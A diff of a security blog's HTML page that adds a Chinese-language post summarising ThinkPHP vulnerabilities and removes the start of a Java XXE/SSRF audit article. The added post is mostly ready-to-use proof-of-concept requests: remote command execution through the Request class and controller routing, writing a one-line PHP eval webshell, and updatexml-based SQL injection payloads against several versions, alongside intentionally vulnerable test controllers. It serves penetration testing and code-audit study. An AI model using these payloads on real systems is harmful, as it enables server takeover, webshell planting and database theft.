@@ -554,6 +554,182 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/ThinkPHP典型漏洞总结20190111/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/17/ThinkPHP典型漏洞总结20190111/" itemprop="url">ThinkPHP典型漏洞总结20190111</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-17T22:16:32+08:00">
+                2019-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试-代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">-[渗透测试] -[代码审计]</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】"><a href="#1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】" class="headerlink" title="1)    ThinkPHP 5.0.x Request类远程命令执行【20190111】"></a>1)    ThinkPHP 5.0.x Request类远程命令执行【20190111】</h3><p>受影响版本：<br>ThinkPHP 5.0.0 - ThinkPHP 5.0.23</p>
+<p>在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通<br>过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_user_func()触发漏洞，实现远程命令执行</p>
+<h4 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15  POC"></a>ThinkPHP 5.0.15  POC</h4><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
+<h4 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23  POC"></a>ThinkPHP 5.0.23  POC</h4><p>下面POC  在debug模式无论关闭或开启均可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-ThinkPHP-5-x-controller远程命令执行【20181209】"><a href="#2-ThinkPHP-5-x-controller远程命令执行【20181209】" class="headerlink" title="2)    ThinkPHP 5.x  controller远程命令执行【20181209】"></a>2)    ThinkPHP 5.x  controller远程命令执行【20181209】</h3><p>受影响版本：<br>ThinkPHP 5.1.x ~ 5.1.31<br>ThinkPHP 5.0.x ~ 5.0.23</p>
+<p>由于框架对于controller控制器名称没有做到足够的检测，导致在使用Pathinfo访问模式（没有开启强制路由）的情况下，造成可能的GetShell</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>在debug模式无论关闭或开启均可成功执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">执行phpinfo</span><br><span class="line">http://127.0.0.1/thinkphp5015//public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">执行系统命令</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">写info.php文件</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/info.php</span><br><span class="line"></span><br><span class="line">写一句话木马</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=www2.php&amp;vars[1][]=&lt;?php @ev[xxx]al($_POST[&apos;123&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】"><a href="#3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】" class="headerlink" title="3)    ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】"></a>3)    ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】</h3><p>如果where语句的条件是数组，而且数组的第一个值是’exp’，那么第二个值就可以直接写SQL语句。这个特性在thinkphp3.1、3.2版本中均存在，通用性比较广。<br>I方法使用filter_exp函数过滤，是在exp后面会加个空格<br>但是filter_exp在I函数的fiter之前，所以如果开发者这样写I(‘get.school’, ‘’, ‘trim’)，那么会直接清除掉exp后面的空格，导致过滤无效。而这个写法是很普遍的。</p>
+<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://***.***.***.***/home/index/login</span><br><span class="line">POST提交</span><br><span class="line">uname[0]=exp&amp;uname[1]=%21%3D1 and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))%23&amp;upwd=admin</span><br></pre></td></tr></table></figure>
+<h3 id="4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】"><a href="#4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】" class="headerlink" title="4)    ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】"></a>4)    ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】</h3><p>ThinkPHP 5.0.9默认依旧是开放debug模式 (‘app_debug’  =&gt; true,)<br>触发该漏洞的关键词有：in 、not in<br>位置：select()、delete()、update()</p>
+<h4 id="漏洞测试代码："><a href="#漏洞测试代码：" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">thinkphp509\application\index\controller\Index.php</span><br><span class="line">	public function sqlvul()</span><br><span class="line">&#123;</span><br><span class="line">    $ids = input(&apos;ids/a&apos;);  // /a 表示参数ids取值的规则是通过数组的形式来获取</span><br><span class="line">    $t = new User();</span><br><span class="line">    $result = $t-&gt;where(&apos;id&apos;, &apos;in&apos;, $ids)-&gt;select();</span><br><span class="line">	//$result = $t-&gt;where(&apos;id&apos;, &apos;not in&apos;, $ids)-&gt;select();</span><br><span class="line">	//$result = $t-&gt;where(&apos;id&apos;, &apos;in&apos;, $ids)-&gt;delete();</span><br><span class="line">	//$result = $t-&gt; update([&apos;username&apos; =&gt; &apos;thinkphp&apos;,&apos;id&apos;=&gt;[&apos;in&apos;,$ids]]);;</span><br><span class="line">    foreach($result as $row) &#123;</span><br><span class="line">        echo &quot;&lt;p&gt;Hello, &#123;$row[&apos;username&apos;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">thinkphp509\application\index\model\User.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace app\index\model;</span><br><span class="line">use think\Model;</span><br><span class="line">class User extends Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $table = &apos;user&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正常请求：<br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1</a><br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2</a></p>
+<h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ThinkPHP-VUL-SUM20190111-41.png" alt=""> </p>
+<h3 id="5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】"><a href="#5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】" class="headerlink" title="5)    ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】"></a>5)    ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】</h3><h4 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h4><p>1）修改数据库配置信息 application/database.php<br>在 application/config.php 中打开调试和trace，app_debug和app_trace均为true。说明：app_debug设置为true是必须的，app_trace可不设<br>2）创建数据库为tptest，表名为user，其中有两个字段id和username<br>3）在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public  function sqlvul()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = input(&apos;get.username/a&apos;);</span><br><span class="line">        //db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 5])-&gt;insert([&apos;username&apos;=&gt;$username]);</span><br><span class="line">db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 3])-&gt;update([&apos;username&apos;=&gt;$username]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">或者</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ThinkPHP-VUL-SUM20190111-51.png" alt=""> </p>
+<h3 id="6-Thinkphp3-2-3-update注入-bind-【20180414】"><a href="#6-Thinkphp3-2-3-update注入-bind-【20180414】" class="headerlink" title="6)    Thinkphp3.2.3 update注入(bind)【20180414】"></a>6)    Thinkphp3.2.3 update注入(bind)【20180414】</h3><p>Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是应用的还是挺多</p>
+<h4 id="漏洞测试代码：-1"><a href="#漏洞测试代码：-1" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function sqlvul3()&#123;</span><br><span class="line">        $User = M(&quot;user&quot;);</span><br><span class="line">        $user[&apos;id&apos;] = I(&apos;id&apos;);</span><br><span class="line">        $data[&apos;username&apos;] = I(&apos;username&apos;);</span><br><span class="line">        $data[&apos;password&apos;] = I(&apos;password&apos;);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>正常请求：（更新用户密码）<br><a href="http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;id=1" target="_blank" rel="noopener">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;id=1</a></p>
+<h4 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;&amp;id[0]=bind&amp;id[1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ThinkPHP-VUL-SUM20190111-61.png" alt=""> </p>
+<h3 id="7-Thinkphp3-2-3-find-select-delete注入【20180823】"><a href="#7-Thinkphp3-2-3-find-select-delete注入【20180823】" class="headerlink" title="7)    Thinkphp3.2.3 find/select/delete注入【20180823】"></a>7)    Thinkphp3.2.3 find/select/delete注入【20180823】</h3><h4 id="漏洞测试代码：-2"><a href="#漏洞测试代码：-2" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function sqlvul1()</span><br><span class="line">   &#123;</span><br><span class="line">      $res = M(&apos;user&apos;)-&gt;find(I(&apos;GET.id&apos;));</span><br><span class="line">      //$res = M(&apos;user&apos;)-&gt;delete(I(&apos;GET.id&apos;));</span><br><span class="line">      //$res = M(&apos;user&apos;)-&gt;select(I(&apos;GET.id&apos;));</span><br><span class="line">      var_dump($res);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>正常请求：<br><a href="http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2</a></p>
+<h4 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[alias]=where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[table]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- #需要知道表明 这里表名的user</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ThinkPHP-VUL-SUM20190111-71.png" alt=""> </p>
+<h3 id="8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】"><a href="#8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】" class="headerlink" title="8)    ThinkPHP 3.2.3/5.1.22 order by注入【20180902】"></a>8)    ThinkPHP 3.2.3/5.1.22 order by注入【20180902】</h3><p>ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。【CVE-2018-16385】</p>
+<h4 id="ThinkPHP3-2-3漏洞测试代码："><a href="#ThinkPHP3-2-3漏洞测试代码：" class="headerlink" title="ThinkPHP3.2.3漏洞测试代码："></a>ThinkPHP3.2.3漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    public function sqlvul2()&#123;</span><br><span class="line">    $data=array();</span><br><span class="line">    $data[&apos;username&apos;]=array(&apos;eq&apos;,&apos;qq123&apos;);</span><br><span class="line">    $order=I(&apos;get.order&apos;);//使用标准的I函数进行安全过滤</span><br><span class="line">    $m=M(&apos;user&apos;)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">    var_dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="ThinkPHP3-2-3-POC"><a href="#ThinkPHP3-2-3-POC" class="headerlink" title="ThinkPHP3.2.3 POC"></a>ThinkPHP3.2.3 POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)]</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul2?order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ThinkPHP-VUL-SUM20190111-81.png" alt=""> </p>
+<h4 id="ThinkPHP5-1-22漏洞测试代码"><a href="#ThinkPHP5-1-22漏洞测试代码" class="headerlink" title="ThinkPHP5.1.22漏洞测试代码"></a>ThinkPHP5.1.22漏洞测试代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">$data=array();</span><br><span class="line">$data[&apos;username&apos;]=array(&apos;eq&apos;,&apos;admin&apos;);</span><br><span class="line">$order=input(&apos;get.order&apos;);//使用input函数进行安全过滤</span><br><span class="line">$m=db(&apos;user&apos;)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="ThinkPHP5-1-22-POC"><a href="#ThinkPHP5-1-22-POC" class="headerlink" title="ThinkPHP5.1.22 POC"></a>ThinkPHP5.1.22 POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5/public/index/index/test/index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/" target="_blank" rel="noopener">http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html</a><br><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a><br><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener">https://xz.aliyun.com/t/2631</a><br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a><br><a href="https://xz.aliyun.com/t/2812" target="_blank" rel="noopener">https://xz.aliyun.com/t/2812</a><br><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104847</a><br><a href="http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a><br><a href="https://www.freebuf.com/vuls/185420.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/185420.html</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1760,181 +1936,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/19/JAVA代码审计之XXE与SSRF/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/19/JAVA代码审计之XXE与SSRF/" itemprop="url">JAVA代码审计之XXE与SSRF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-19T09:38:36+08:00">
-                2018-09-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/代码审计/" itemprop="url" rel="index">
-                    <span itemprop="name">代码审计</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>2018-09-19 首发于阿里先知: <a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">https://xz.aliyun.com/t/2761</a></p>
-<h3 id="一、XXE"><a href="#一、XXE" class="headerlink" title="一、XXE"></a>一、XXE</h3><h4 id="0x01-XXE漏洞简介"><a href="#0x01-XXE漏洞简介" class="headerlink" title="0x01 XXE漏洞简介"></a>0x01 XXE漏洞简介</h4><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p>
-<h4 id="0x02-XXE相关基础概念"><a href="#0x02-XXE相关基础概念" class="headerlink" title="0x02 XXE相关基础概念"></a>0x02 XXE相关基础概念</h4><h5 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h5><p>XML （可扩展标记语言，EXtensible Markup Language），是一种标记语言，用来传输和存储数据，而非显示数据。<br>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
-<h5 id="实体ENTITY"><a href="#实体ENTITY" class="headerlink" title="实体ENTITY"></a>实体ENTITY</h5><p>XML中的实体类型，一般有下面几种：字符实体、命名实体（或内部实体）、外部普通实体、外部参数实体。除外部参数实体外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p>
-<h6 id="1-字符实体"><a href="#1-字符实体" class="headerlink" title="1)字符实体"></a>1)字符实体</h6><p>字符实体类似html中的实体编码，形如：&#97;（十进制）或者&#x61;（十六进制）。</p>
-<h6 id="2-命名实体（内部实体）"><a href="#2-命名实体（内部实体）" class="headerlink" title="2)命名实体（内部实体）"></a>2)命名实体（内部实体）</h6><p>内部实体又称为命名实体。命名实体可以说成是变量声明，命名实体只能声明在DTD或者XML文件开始部分（&lt;!DOCTYPE&gt;语句中）。<br>命名实体（或内部实体）语法：<br><figure class="highlight plain"><figcaption><span>实体名称 "实体的值">```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br></pre></td></tr></table></figure></p>
-<p>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;!DOCTYPE root [<br>    &lt;!ENTITY x “First Param!”&gt;<br>    &lt;!ENTITY y “Second Param!”&gt;<br>]&gt;</p>
-<p><root><x>&x;</x><y>&y;</y></root><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">定义一个实体名称x 值为First Param!</span><br><span class="line">&amp;x;  引用实体x</span><br><span class="line"></span><br><span class="line">###### 3)外部普通实体 </span><br><span class="line">外部实体用于加载外部文件的内容。（显式XXE攻击主要利用外部普通实体）</span><br><span class="line">外部普通实体语法：</span><br><span class="line">```&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPe root [</span><br><span class="line">    &lt;!ENTITY outfile SYSTEM &quot;outfile.xml&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;outfile&gt;&amp;outfile;&lt;/outfile&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
